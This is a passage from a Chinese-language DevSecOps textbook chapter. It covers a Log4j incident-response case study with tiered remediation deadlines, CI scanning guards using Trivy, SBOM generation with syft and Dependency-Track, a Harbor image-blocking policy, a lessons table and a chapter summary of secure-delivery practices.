    - action: "升级 Log4j 到 2.17.0（安全版本），立即发布热修复"

  high:
    - services: [notification-service, recommendation-engine, search-service]
    - count: 100 (非核心但有用户影响)
    - deadline: 12 hours
    - action: "升级或应用临时缓解措施（设置 log4j2.formatMsgNoLookups=true）"

  medium:
    - services: [admin-console, reporting-service]
    - count: 60 (仅内部使用)
    - deadline: 24 hours
    - action: "设置 JVM 参数 -Dlog4j2.disable.jndi=true"
```

```yaml
# CI 流水线中的 Log4j 专项阻断策略
.github/workflows/log4j-guard.yaml:

name: Log4j Vulnerability Guard
on: [pull_request]
jobs:
  check-log4j:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - name: Scan for Log4j vulnerable versions
      run: |
        # 扫描所有 pom.xml/build.gradle 中的 Log4j 依赖
        trivy fs --scanners vuln --severity CRITICAL \
          --exit-code 1 --ignore-unfixed \
          --vuln-type library .
    - name: Block vulnerable PR
      if: failure()
      run: |
        echo "❌ 检测到未修复的 Log4j 漏洞，PR 已被阻断"
        echo "请将 Log4j 升级到 >= 2.17.0"
        exit 1
```

#### 阶段三：长期措施（T+24h ~ T+1周）

**1. 建立 SBOM 生成流水线**：

```yaml
# 所有镜像构建时自动生成 SBOM
stages:
  - build
  - sbom
  - scan
  - push

sbom-gen:
  stage: sbom
  script:
    - syft packages ${CI_REGISTRY_IMAGE}:${CI_COMMIT_SHA} -o cyclonedx-json > sbom.json
  artifacts:
    paths: [sbom.json]

sbom-upload:
  stage: sbom
  needs: [sbom-gen]
  script:
    - curl -X POST "https://dtrack.internal/api/v1/bom" \
      -H "X-API-Key: ${DTRACK_API_KEY}" \
      -F "project=${CI_PROJECT_NAME}" \
      -F "bom=@sbom.json"
```

**2. Harbor 配置镜像扫描阻断策略**：

```yaml
# Harbor 配置：阻断含 Critical 漏洞的镜像
harbor:
  vulnerability:
    scan_all: true
    scan_on_push: true
    block_policy:
      severity: high
      action: block_artifact
      deny_tags: ["latest", "prod-*"]
```

**3. 建立安全扫描 Dashboard**：

```python
# 简化的 Dashboard 数据聚合
# 使用 Grafana + Prometheus 从 Dependency-Track 拉取数据
{
    "dashboard": "供应链安全全景",
    "panels": [
        {"name": "SBOM 覆盖率", "目标": "100%", "当前": "100%"},
        {"name": "CRITICAL 漏洞数", "目标": "0", "当前": "已清零"},
        {"name": "镜像扫描覆盖率", "目标": "100%", "当前": "100%"},
        {"name": "修复SLA达成率", "目标": "100%", "当前": "95%"}
    ]
}
```

### 结果

| 指标 | 初始状态 | 应急响应后 | 长期措施后 |
|------|---------|-----------|-----------|
| Critical 服务修复 | — | 20个服务4小时内完成 | 所有新镜像自动扫描阻断 |
| 全量服务修复 | — | 180个服务24小时内完成 | SBOM 覆盖率 100% |
| 新增漏洞发现时间 | 数天~数周（被动） | 即时（镜像推送时） | 即时（CI 编排中） |
| 应急响应复现时间 | 靠人工排查（效率极低） | 数小时批量扫描 | 分钟级（Dependency-Track） |
| 后续安全事故 | 不定期发生 | 无 Log4j 类漏洞复发 | 持续 0 Critical |

### 教训总结

| 教训 | 具体问题 | 改进措施 |
|------|---------|---------|
| **SBOM 缺失** | 没有 SBOM，排查靠人肉 grep 每个仓库，效率极低 | 所有镜像构建时自动生成 SBOM 并上传 Dependency-Track |
| **缺乏自动化阻断** | 旧的镜像仍然包含漏洞 | Harbor 配置自动扫描阻断策略 |
| **应急流程不成熟** | 4小时内识别受影响服务已经很紧张 | 建立安全的 Playbook + 自动化扫描 Pipeline |
| **依赖治理薄弱** | 团队不清楚各自服务的第三方依赖版本 | 建立全平台的依赖矩阵 Dashboard |
| **跨团队协作成本高** | 200+ 服务需要逐个通知团队 | 建立安全应急通知 + 集中修复平台 |

> **"没有 SBOM 的应急响应，就像没有地图的搜救行动。"** 这次事件之后，该平台将 SBOM 生成和自动化漏洞扫描确立为 DevSecOps 的核心门禁，并将响应时间从数小时压缩到分钟级。

## 本章小结

| 要点 | 说明 |
|------|------|
| 安全左移 | 越早发现修复成本越低，从 IDE 到 CI 各阶段嵌入安全检查 |
| SAST | 不运行代码的情况下分析源码漏洞 |
| SCA | 扫描开源依赖的 CVE 和许可证合规性 |
| 供应链安全 | SLSA L1~L4 可信度分级，SBOM/CycloneDX+SPDX，Cosign+Sigstore镜像签名 |
| 镜像安全 | 基线镜像、Trivy 扫描、非 root 运行、只读根文件系统 |
| DAST | 运行时攻击测试，ZAP/Burp/Acunetix 选型 |
| 密钥管理 | 绝不硬编码！使用 Vault / K8s Secret / SOPS；自动轮换+零停机方案（蓝绿密钥、双读双写） |
| 密钥轮换 | 自动 vs 手动，双读双写和蓝绿密钥方案保障轮换零停机 |
| 合规框架 | PCI-DSS/SOC2/ISO27001/GDPR 安全控制映射到具体工具和门禁实践 |
| 运行时安全 | Falco 监控异常行为，NetworkPolicy 最小网络权限 |
| 零信任 | 永远验证、最小权限、mTLS 加密 |
| 安全门禁 | 按严重级别分级：阻断 / 告警 / 记录 |

